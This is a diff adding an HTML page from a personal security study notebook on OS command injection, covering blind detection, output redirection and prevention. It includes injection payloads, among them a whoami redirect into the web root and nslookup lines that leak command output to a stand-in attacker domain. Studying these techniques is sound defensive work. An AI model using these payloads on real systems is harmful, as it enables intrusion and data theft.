@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Personal - My Notebook Website</title>
+    <link rel="stylesheet" href="../../Static/styles.css">
+</head>
+<body>
+    <header>
+        <h1>Welcome to My Notebook</h1>
+        <nav>
+            <ul>
+                <li><a href="../../Main.html">Home</a></li>
+            </ul>
+        </nav>
+        <h4> OS-Command-Injection</h4>
+    </header>
+    <h1 id="os-command-injection">OS command injection</h1>
+<ul>
+<li><p><strong>What is OS command injection?</strong></p>
+<ul>
+<li>command injection is a type of security vulnerability that occurs when an attacker is able to execute arbitrary commands on a host operating system through a vulnerable application. This vulnerability arises when an application incorporates user-supplied input into a command that is sent to the operating system for execution without proper validation or sanitization.</li>
+</ul>
+</li>
+<li><p><strong>Here&#39;s how OS command injection typically works:</strong> </p>
+<ol>
+<li><p><strong>User Input:</strong> The vulnerable application takes user input from an untrusted source, such as form fields, URL parameters, or HTTP headers. </p>
+</li>
+<li><p><strong>Command Execution:</strong> The application constructs an operating system command using the user-supplied input and executes it without properly validating or sanitizing the input.</p>
+</li>
+<li><p><strong>Injection:</strong> An attacker exploits the vulnerability by inserting malicious commands or characters into the user input. These injected commands are then executed by the operating system with the same privileges as the vulnerable application.</p>
+</li>
+<li><p><strong>Impact:</strong> Depending on the privileges of the vulnerable application, the attacker may be able to execute arbitrary commands, access sensitive files, modify data, or even take control of the entire system.</p>
+</li>
+</ol>
+</li>
+<li><p><strong>Blind OS command injection vulnerabilities</strong> </p>
+<ul>
+<li><p>Many instances of OS command injection are blind vulnerabilities. This means that the application does not return the output from the command within its HTTP response. Blind vulnerabilities can still be exploited, but different techniques are required.</p>
+</li>
+<li><p><strong>Detecting blind OS command injection using time delays</strong>     </p>
+<p>  -You can use an injected command to trigger a time delay, enabling you to confirm that the command was executed based on the time that the application takes to respond. The ping command is a good way to do this, because lets you specify the number of ICMP packets to send. This enables you to control the time taken for the command to run:   <code>&amp; ping -c 10 127.0.0.1 &amp;</code></p>
+</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p><strong>Exploiting blind OS command injection by redirecting output</strong>  </p>
+<ul>
+<li><p>You can redirect the output from the injected command into a file within the web root that you can then retrieve using the browser. For example, if the application serves static resources from the filesystem location <code>/var/www/static</code>, then you can submit the following input:       <code>&amp; whoami &gt; /var/www/static/whoami.txt &amp;</code> </p>
+</li>
+<li><p>The &gt; character sends the output from the whoami command to the specified file. You can then use the browser to fetch <code>https://vulnerable-website.com/whoami.txt</code> to retrieve the file, and view the output from the injected command. </p>
+</li>
+</ul>
+</li>
+<li><p><strong>Exploiting blind OS command injection using out-of-band (OAST) techniques</strong> </p>
+<ul>
+<li>You can use an injected command that will trigger an out-of-band network interaction with a system that you control, using OAST techniques. For example: <code>&amp; nslookup kgji2ohoyw.web-attacker.com &amp;</code> [Burp collaborator ]
+<code>&amp; nslookup `whoami`.kgji2ohoyw.web-attacker.com &amp;</code></li>
+</ul>
+</li>
+<li><p><strong>How to prevent OS command injection attacks?</strong></p>
+<ul>
+<li><p>If you have to call out to OS commands with user-supplied input, then you must perform strong input validation. Some examples of effective validation include:</p>
+<ol>
+<li>Validating against a whitelist of permitted values.</li>
+<li>Validating that the input is a number.  </li>
+<li>Validating that the input contains only alphanumeric characters, no other syntax or whitespace.</li>
+</ol>
+</li>
+</ul>
+</li>
+</ul>
+
+    <footer>
+        <p>&copy;hu1k0 Notebook Website</p>
+    </footer>
+</body>
+</html>
